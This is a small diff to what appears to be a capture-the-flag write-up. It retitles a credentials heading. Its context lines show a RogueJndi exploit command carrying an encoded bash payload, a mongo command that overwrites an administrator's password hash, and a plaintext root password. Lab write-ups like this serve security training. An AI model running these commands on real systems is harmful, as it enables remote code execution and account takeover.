@@ -85,7 +85,7 @@ java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtY
 mongo --port 27117 ace --eval 'db.admin.update({ "_id" : ObjectId("61ce278f46e0fb0012d47ee4") }, { $set: {"x_shadow": "$6$IFBZtn6385/9WoBj$P2xfXWboxRUgs1f9VWnLdRPDSzTEK6oU0My2XIAFUihokov7h2PwrvcHiLIp6sa0vSdNuby8hjbskoqRyapb31"}})'
 ```
 
-# credentials
+# credentials found on the website
 ```
 root
 NotACrackablePassword4U2022
